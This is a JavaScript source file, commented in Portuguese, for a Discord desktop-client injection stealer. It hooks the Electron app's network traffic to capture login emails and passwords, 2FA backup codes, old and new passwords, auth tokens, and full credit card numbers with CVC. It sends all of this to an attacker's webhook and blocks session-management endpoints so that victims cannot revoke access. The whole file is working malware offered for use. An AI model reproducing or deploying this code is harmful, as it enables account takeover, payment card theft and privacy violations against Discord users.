// infection.js - VERSÃO COMPLETA CORRIGIDA
const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');
const querystring = require('querystring');

const CONFIG = {
    webhook: "%WEBHOOK%", // Será substituído pelo Python
    API: "https://discord.com/api/v9/users/@me",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
    badges: {
        Discord_Emloyee: { Value: 1, Emoji: "<:8485discordemployee:1163172252989259898>", Rare: true },
        Partnered_Server_Owner: { Value: 2, Emoji: "<:9928discordpartnerbadge:1163172304155586570>", Rare: true },
        HypeSquad_Events: { Value: 4, Emoji: "<:9171hypesquadevents:1163172248140660839>", Rare: true },
        Bug_Hunter_Level_1: { Value: 8, Emoji: "<:4744bughunterbadgediscord:1163172239970140383>", Rare: true },
        Early_Supporter: { Value: 512, Emoji: "<:5053earlysupporter:1163172241996005416>", Rare: true },
        Bug_Hunter_Level_2: { Value: 16384, Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>", Rare: true },
        Early_Verified_Bot_Developer: { Value: 131072, Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>", Rare: true },
        House_Bravery: { Value: 64, Emoji: "<:6601hypesquadbravery:1163172246492287017>", Rare: false },
        House_Brilliance: { Value: 128, Emoji: "<:6936hypesquadbrilliance:1163172244474822746>", Rare: false },
        House_Balance: { Value: 256, Emoji: "<:5242hypesquadbalance:1163172243417858128>", Rare: false },
        Active_Developer: { Value: 4194304, Emoji: "<:1207iconactivedeveloper:1163172534443851868>", Rare: false },
        Certified_Moderator: { Value: 262144, Emoji: "<:4149blurplecertifiedmoderator:1163172255489085481>", Rare: true },
        Spammer: { Value: 1048704, Emoji: "⌨️", Rare: false },
    },
};

// ========== FUNÇÕES PRINCIPAIS ==========

// Função para obter token usando o método do Discord
const getToken = async () => {
    try {
        const { BrowserWindow } = require('electron');
        const window = BrowserWindow.getAllWindows()[0];
        if (!window) return null;
        
        const token = await window.webContents.executeJavaScript(`
            (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)
            .find(m=>m?.exports?.default?.getToken!==void 0)
            .exports.default.getToken()
        `);
        return token;
    } catch (e) {
        return null;
    }
};

// Função para fazer requisições HTTPS
const request = (method, url, headers, data) => {
    return new Promise((resolve, reject) => {
        const parsedUrl = new URL(url);
        const options = {
            hostname: parsedUrl.hostname,
            path: parsedUrl.pathname + parsedUrl.search,
            method: method,
            headers: headers || {}
        };

        const req = https.request(options, (res) => {
            let responseData = '';
            res.on('data', (chunk) => responseData += chunk);
            res.on('end', () => resolve(responseData));
        });

        req.on('error', reject);
        if (data) req.write(data);
        req.end();
    });
};

// Função para enviar para o webhook
const hooker = async (content, token, account) => {
    try {
        content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
        content["username"] = "Discord Injector";
        content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
        
        if (content["embeds"] && content["embeds"][0]) {
            content["embeds"][0]["author"] = { "name": account.username || "Unknown" };
            content["embeds"][0]["thumbnail"] = {
                "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
            };
            content["embeds"][0]["footer"] = {
                "text": "Discord Injection",
                "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
            };
            content["embeds"][0]["title"] = "Account Information";
            content["embeds"][0]["color"] = 0x5865F2;
        }

        await request("POST", CONFIG.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(content));
    } catch (e) {
        // Silencioso
    }
};

// ========== FUNÇÕES DE FETCH ==========

const fetchAccount = async (token) => {
    try {
        const data = await request("GET", CONFIG.API, { "Authorization": token });
        return JSON.parse(data);
    } catch { return null; }
};

const fetchBilling = async (token) => {
    try {
        const data = await request("GET", CONFIG.API + "/billing/payment-sources", { "Authorization": token });
        return JSON.parse(data);
    } catch { return []; }
};

const fetchServers = async (token) => {
    try {
        const data = await request("GET", CONFIG.API + "/guilds?with_counts=true", { "Authorization": token });
        return JSON.parse(data);
    } catch { return []; }
};

const fetchFriends = async (token) => {
    try {
        const data = await request("GET", CONFIG.API + "/relationships", { "Authorization": token });
        return JSON.parse(data);
    } catch { return []; }
};

// ========== FUNÇÕES DE FORMATAÇÃO ==========

const getNitro = (flags) => {
    switch (flags) {
        case 1: return '`Nitro Classic`';
        case 2: return '`Nitro Boost`';
        case 3: return '`Nitro Basic`';
        default: return '`❌`';
    }
};

const getBadges = (flags) => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
    }
    return badges || '`❌`';
};

const getRareBadges = (flags) => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value && b.Rare) badges += b.Emoji + ' ';
    }
    return badges;
};

const getBilling = async (token) => {
    const data = await fetchBilling(token);
    let billing = '';
    if (Array.isArray(data)) {
        data.forEach((x) => {
            if (!x.invalid) {
                switch (x.type) {
                    case 1: billing += '💳 '; break;
                    case 2: billing += '💰 '; break;
                }
            }
        });
    }
    return billing || '`❌`';
};

const getFriends = async (token) => {
    const friends = await fetchFriends(token);
    if (!Array.isArray(friends)) return { message: "**No Rare Friends**", totalFriends: 0 };
    
    const filteredFriends = friends.filter((user) => user.type == 1);
    let rareUsers = "";
    for (const acc of filteredFriends) {
        const badges = getRareBadges(acc.user.public_flags);
        if (badges != "") {
            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
            rareUsers += `${badges} ${acc.user.username}\n`;
        }
    }
    rareUsers = rareUsers || "**No Rare Friends**";
    return { message: rareUsers, totalFriends: friends.length };
};

const getServers = async (token) => {
    const guilds = await fetchServers(token);
    if (!Array.isArray(guilds)) return { message: "**No Rare Servers**", totalGuilds: 0 };
    
    const filteredGuilds = guilds.filter((guild) => 
        guild.permissions == '562949953421311' || guild.permissions == '2251799813685247'
    );
    let rareGuilds = "";
    for (const guild of filteredGuilds) {
        if (rareGuilds === "") rareGuilds += `**Rare Servers:**\n`;
        rareGuilds += `${guild.owner ? "👑 Owner" : "⚙️ Admin"} | Server: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
    }
    rareGuilds = rareGuilds || "**No Rare Servers**";
    return { message: rareGuilds, totalGuilds: guilds.length };
};

// ========== FUNÇÕES DE CAPTURA DE EVENTOS ==========

const EmailPassToken = async (email, password, token, action) => {
    const account = await fetchAccount(token);
    if (!account) return;

    const content = {
        "content": `**${account.username}** just ${action}!`,
        "embeds": [{
            "fields": [
                { "name": "Email", "value": "`" + email + "`", "inline": true },
                { "name": "Password", "value": "`" + password + "`", "inline": true }
            ]
        }]
    };
    await hooker(content, token, account);
};

const BackupCodesViewed = async (codes, token) => {
    const account = await fetchAccount(token);
    if (!account) return;

    const filteredCodes = codes.filter((code) => code.consumed === false);
    let message = "";
    for (let code of filteredCodes) {
        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
    }
    const content = {
        "content": `**${account.username}** just viewed his 2FA backup codes!`,
        "embeds": [{
            "fields": [
                { "name": "Backup Codes", "value": "```" + message + "```", "inline": false },
                { "name": "Email", "value": "`" + account.email + "`", "inline": true },
                { "name": "Phone", "value": "`" + (account.phone || "None") + "`", "inline": true }
            ]
        }]
    };
    await hooker(content, token, account);
};

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token);
    if (!account) return;

    const content = {
        "content": `**${account.username}** just changed his password!`,
        "embeds": [{
            "fields": [
                { "name": "New Password", "value": "`" + newPassword + "`", "inline": true },
                { "name": "Old Password", "value": "`" + oldPassword + "`", "inline": true }
            ]
        }]
    };
    await hooker(content, token, account);
};

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchAccount(token);
    if (!account) return;

    const content = {
        "content": `**${account.username}** just added a credit card!`,
        "embeds": [{
            "fields": [
                { "name": "Number", "value": "`" + number + "`", "inline": true },
                { "name": "CVC", "value": "`" + cvc + "`", "inline": true },
                { "name": "Expiration", "value": "`" + month + "/" + year + "`", "inline": true }
            ]
        }]
    };
    await hooker(content, token, account);
};

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token);
    if (!account) return;

    const content = {
        "content": `**${account.username}** just added a PayPal account!`,
        "embeds": [{
            "fields": [
                { "name": "Email", "value": "`" + account.email + "`", "inline": true },
                { "name": "Phone", "value": "`" + (account.phone || "None") + "`", "inline": true }
            ]
        }]
    };
    await hooker(content, token, account);
};

const sendFullInfo = async (token) => {
    const account = await fetchAccount(token);
    if (!account) return;

    const nitro = getNitro(account.premium_type);
    const badges = getBadges(account.flags);
    const billing = await getBilling(token);
    const friends = await getFriends(token);
    const servers = await getServers(token);

    const content = {
        "content": `**${account.username}** just got injected!`,
        "embeds": [{
            "fields": [
                { "name": "Email", "value": "`" + account.email + "`", "inline": true },
                { "name": "Phone", "value": "`" + (account.phone || "None") + "`", "inline": true },
                { "name": "Token", "value": "```" + token + "```", "inline": false },
                { "name": "Nitro", "value": nitro, "inline": true },
                { "name": "Badges", "value": badges, "inline": true },
                { "name": "Billing", "value": billing, "inline": true }
            ]
        }, {
            "title": `Total Friends: ${friends.totalFriends}`,
            "description": friends.message,
        }, {
            "title": `Total Servers: ${servers.totalGuilds}`,
            "description": servers.message,
        }]
    };
    await hooker(content, token, account);
};

// ========== INICIALIZAÇÃO E ESCUTA ==========

let email = "";
let password = "";

// Função para interceptar requisições
const setupInterceptor = async () => {
    try {
        const { BrowserWindow, session } = require('electron');
        
        // Espera a janela principal
        let mainWindow = BrowserWindow.getAllWindows()[0];
        if (!mainWindow) {
            setTimeout(setupInterceptor, 1000);
            return;
        }

        // Ativa o debugger
        mainWindow.webContents.debugger.attach('1.3');
        
        // Escuta mensagens do debugger
        mainWindow.webContents.debugger.on('message', async (_, method, params) => {
            if (method !== 'Network.responseReceived') return;
            if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
            if (![200, 202].includes(params.response.status)) return;

            try {
                const responseData = JSON.parse(
                    await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
                        requestId: params.requestId
                    }).then(r => r.body)
                );

                const requestData = JSON.parse(
                    await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
                        requestId: params.requestId
                    }).then(r => r.postData)
                );

                const token = await getToken();
                if (!token) return;

                // Captura eventos específicos
                if (params.response.url.endsWith('/login')) {
                    if (!responseData.token) {
                        email = requestData.login;
                        password = requestData.password;
                        return;
                    }
                    await EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                }
                else if (params.response.url.endsWith('/register')) {
                    await EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                }
                else if (params.response.url.endsWith('/totp')) {
                    await EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                }
                else if (params.response.url.endsWith('/codes-verification')) {
                    await BackupCodesViewed(responseData.backup_codes, token);
                }
                else if (params.response.url.endsWith('/@me')) {
                    if (requestData.password) {
                        if (requestData.email) {
                            await EmailPassToken(requestData.email, requestData.password, token, "changed email to **" + requestData.email + "**");
                        }
                        if (requestData.new_password) {
                            await PasswordChanged(requestData.new_password, requestData.password, token);
                        }
                    }
                }
            } catch (e) {
                // Ignora erros
            }
        });

        // Habilita o Network
        await mainWindow.webContents.debugger.sendCommand('Network.enable');

        // Intercepta pagamentos
        session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
            if (![200, 202].includes(details.statusCode)) return;
            if (details.method != 'POST') return;
            
            try {
                const token = await getToken();
                if (!token) return;

                if (details.url.endsWith('tokens')) {
                    const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
                    await CreditCardAdded(
                        item['card[number]'],
                        item['card[cvc]'],
                        item['card[exp_month]'],
                        item['card[exp_year]'],
                        token
                    );
                } else if (details.url.endsWith('paypal_accounts')) {
                    await PaypalAdded(token);
                }
            } catch (e) {
                // Ignora
            }
        });

        // Bloqueia logout
        session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
            if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) {
                return callback({ cancel: true });
            }
            callback();
        });

        // Envia informações completas
        setTimeout(async () => {
            const token = await getToken();
            if (token) {
                await sendFullInfo(token);
            }
        }, 5000);

    } catch (e) {
        // Se falhar, tenta novamente
        setTimeout(setupInterceptor, 2000);
    }
};

// INICIA
setupInterceptor();
